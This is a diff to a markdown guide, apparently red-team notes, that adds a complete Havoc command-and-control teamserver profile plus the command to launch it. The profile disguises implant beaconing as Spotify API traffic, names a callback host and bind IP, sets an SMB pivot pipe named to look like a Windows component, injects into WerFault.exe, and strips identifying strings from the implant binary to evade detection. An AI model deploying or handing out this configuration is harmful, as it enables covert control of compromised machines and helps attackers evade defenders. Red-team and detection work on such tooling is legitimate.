@@ -21,6 +21,92 @@
 - **Execute**: Native/Syscall
 - **Spawn64**: `C:\Windows\System32\notepad.exe`
 
+#### **Profile Configuration**
+
+- **Havoc Documentation - Profiles**: [havoc-profiles](https://havocframework.com/docs/profiles)
+
+- **Example Profile - `spotify.yaotl`**  
+
+```yaotl
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "operator" {
+        Password = "password1234"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "spotify profile - http"
+        Hosts        = [
+            "myprivatevpn.com",  
+        ]
+        HostBind     = "8.209.128.8"   
+        PortBind     = 443
+        PortConn     = 443         
+        HostRotation = "round-robin" 
+        Secure       = false       
+        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Spotify/1.1.10.540"
+        Uris         = ["/v1/me/player/currently-playing", "/v1/me/player/recently-played"]
+        Headers = [
+            "Accept: application/json",
+            "Referer: https://open.spotify.com/",
+            "Accept-Encoding: gzip, deflate, br",
+            "Origin: https://open.spotify.com"
+        ]
+
+        Response {
+            Headers = [
+                "Content-type: text/plain, charset=utf-8",
+                "Access-Control-Allow-Origin: https://spotify.com",
+                "Connection: keep-alive",
+                "Cache-control: no-cache"
+            ]
+        }
+    }
+
+    Smb {
+        Name     = "Pivot - Smb"
+        PipeName = "Winsock2\\CatalogChangeListener-777-0"
+    }
+}
+
+Service {
+    Endpoint = "service-endpoint"
+    Password = "service-password"
+}
+
+Demon {
+    Sleep = 5
+    Jitter = 25
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\Werfault.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\Werfault.exe"
+    }
+
+    Binary {
+        ReplaceStrings-x64 = {
+            "demon.x64.dll": "",
+            "This program cannot be run in DOS mode.": ""
+        }
+    }
+}
+```
+
+- **Use Profile - `./havoc server --profile ./profiles/spotify.yaotl -v --debug`**  
 
 #### **Import Module**
 
